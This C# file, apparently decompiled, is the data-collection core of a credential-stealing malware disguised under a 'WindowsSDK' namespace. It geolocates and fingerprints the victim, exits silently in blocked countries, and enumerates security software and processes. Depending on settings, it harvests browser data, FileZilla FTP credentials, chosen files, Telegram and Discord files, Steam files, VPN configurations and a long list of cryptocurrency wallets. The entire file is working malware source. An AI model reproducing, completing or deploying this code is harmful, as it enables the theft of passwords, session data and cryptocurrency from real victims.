using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Security.Principal;
using System.Windows.Forms;
using WindowsSDK.Data.Credentials;
using WindowsSDK.Data.Crypto;
using WindowsSDK.Data.Files;
using WindowsSDK.Data.Files.Rules;
using WindowsSDK.Helpers;
using WindowsSDK.Objects.Browsers;
using WindowsSDK.Objects.Enums;
using WindowsSDK.Objects.Info;
using WindowsSDK.Objects.Serialization;

namespace WindowsSDK.Data
{
    public static class ResultFactory
    {
        public static bool Create(ScanningArgs settings, ref ScanResult result)
        {
            try
            {
                GeoInfo geoInfo = GeoHelper.Get();
                geoInfo.IP = (string.IsNullOrWhiteSpace(geoInfo.IP) ? "UNKNOWN" : geoInfo.IP);
                geoInfo.Location = (string.IsNullOrWhiteSpace(geoInfo.Location) ? "UNKNOWN" : geoInfo.Location);
                geoInfo.Country = (string.IsNullOrWhiteSpace(geoInfo.Country) ? "UNKNOWN" : geoInfo.Country);
                geoInfo.PostalCode = (string.IsNullOrWhiteSpace(geoInfo.PostalCode) ? "UNKNOWN" : geoInfo.PostalCode);
                List<string> blockedCountry = settings.BlockedCountry;
                if (blockedCountry != null && blockedCountry.Count > 0 && settings.BlockedCountry.Contains(geoInfo.Country))
                {
                    Environment.Exit(0);
                }
                List<string> blockedIP = settings.BlockedIP;
                if (blockedIP != null && blockedIP.Count > 0 && settings.BlockedIP.Contains(geoInfo.IP))
                {
                    Environment.Exit(0);
                }
                result.IPv4 = geoInfo.IP;
                result.City = geoInfo.Location;
                result.Country = geoInfo.Country;
                result.ZipCode = geoInfo.PostalCode;
                result.Hardware = CryptoHelper.GetMd5Hash(Environment.UserDomainName + WindowsIdentity.GetCurrent().Name.Split('\\').Last() + SystemInfoHelper.GetSerialNumber()).Replace("-", string.Empty);
                try
                {
                    result.FileLocation = Assembly.GetExecutingAssembly().Location;
                }
                catch
                {
                }
                result.Language = InputLanguage.CurrentInputLanguage.Culture.EnglishName;
                result.TimeZone = TimeZoneInfo.Local.DisplayName;
                Size displayResolution = DisplayHelper.GetDisplayResolution();
                result.ScreenSize = $"{displayResolution.Width}x{displayResolution.Height}";
                result.OSVersion = SystemInfoHelper.GetWindowsVersion();
                try
                {
                    result.MachineName = WindowsIdentity.GetCurrent().Name.Split('\\').Last();
                }
                catch
                {
                }
                result.ScanDetails = new ScanDetails
                {
                    AvailableLanguages = new List<string>(),
                    Browsers = new List<ScannedBrowser>(),
                    FtpConnections = new List<Account>(),
                    GameChatFiles = new List<ScannedFile>(),
                    GameLauncherFiles = new List<ScannedFile>(),
                    InstalledBrowsers = new List<BrowserVersion>(),
                    MessageClientFiles = new List<ScannedFile>(),
                    Nord = new List<Account>(),
                    Open = new List<ScannedFile>(),
                    Processes = new List<string>(),
                    Proton = new List<ScannedFile>(),
                    ScannedFiles = new List<ScannedFile>(),
                    ScannedWallets = new List<ScannedFile>(),
                    SecurityUtils = new List<string>(),
                    Softwares = new List<string>(),
                    SystemHardwares = new List<SystemHardware>()
                };
                foreach (SystemHardware processor in SystemInfoHelper.GetProcessors())
                {
                    result.ScanDetails.SystemHardwares.Add(processor);
                }
                foreach (SystemHardware graphicCard in SystemInfoHelper.GetGraphicCards())
                {
                    result.ScanDetails.SystemHardwares.Add(graphicCard);
                }
                result.ScanDetails.InstalledBrowsers = SystemInfoHelper.GetBrowsers();
                result.ScanDetails.SystemHardwares.Add(new SystemHardware
                {
                    Name = new string(new char[12]
                    {
                        'T', 'o', 't', 'a', 'l', ' ', 'o', 'f', ' ', 'R',
                        'A', 'M'
                    }),
                    HardType = HardwareType.Graphic,
                    Counter = SystemInfoHelper.TotalOfRAM()
                });
                result.ScanDetails.Softwares = SystemInfoHelper.ListOfPrograms();
                result.ScanDetails.SecurityUtils = SystemInfoHelper.SystemDefenders();
                result.ScanDetails.Processes = SystemInfoHelper.ListOfProcesses();
                result.ScanDetails.AvailableLanguages = SystemInfoHelper.AvailableLanguages();
                if (settings.ScanScreen)
                {
                    result.Monitor = DisplayHelper.Parse();
                }
                if (settings.ScanTelegram)
                {
                    result.ScanDetails.MessageClientFiles.AddRange(FileScanner.Scan(new DesktopMessangerRule()));
                }
                if (settings.ScanBrowsers)
                {
                    result.ScanDetails.Browsers.AddRange(Chrome.Scan(settings.ScanChromeBrowsersPaths));
                    result.ScanDetails.Browsers.AddRange(Gecko.Scan(settings.ScanGeckoBrowsersPaths));
                }
                if (settings.ScanFiles)
                {
                    result.ScanDetails.ScannedFiles = RecoursiveFileGrabber.Scan(settings.ScanFilesPaths);
                }
                if (settings.ScanFTP)
                {
                    result.ScanDetails.FtpConnections = FileZilla.Scan();
                }
                if (settings.ScanWallets)
                {
                    result.ScanDetails.ScannedWallets = new List<ScannedFile>();
                    result.ScanDetails.ScannedWallets.AddRange(FileScanner.Scan(new ArmoryRule(), new AtomicRule(), new CoinomiRule(), new ElectrumRule(), new EthereumRule(), new ExodusRule(), new GuardaRule(), new JaxxRule(), new MetamaskRule(), new MoneroRule(), new TronlinkRule(), new AllWalletsRule()));
                }
                if (settings.ScanDiscord)
                {
                    result.ScanDetails.GameChatFiles = FileScanner.Scan(new DiscordRule());
                }
                if (settings.ScanSteam)
                {
                    result.ScanDetails.GameLauncherFiles = FileScanner.Scan(new GameLauncherRule());
                }
                if (settings.ScanVPN)
                {
                    result.ScanDetails.Open = FileScanner.Scan(new OpenVPNRule());
                    result.ScanDetails.Proton = FileScanner.Scan(new ProtonVPNRule());
                    result.ScanDetails.Nord = NordVPN.Scan();
                }
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
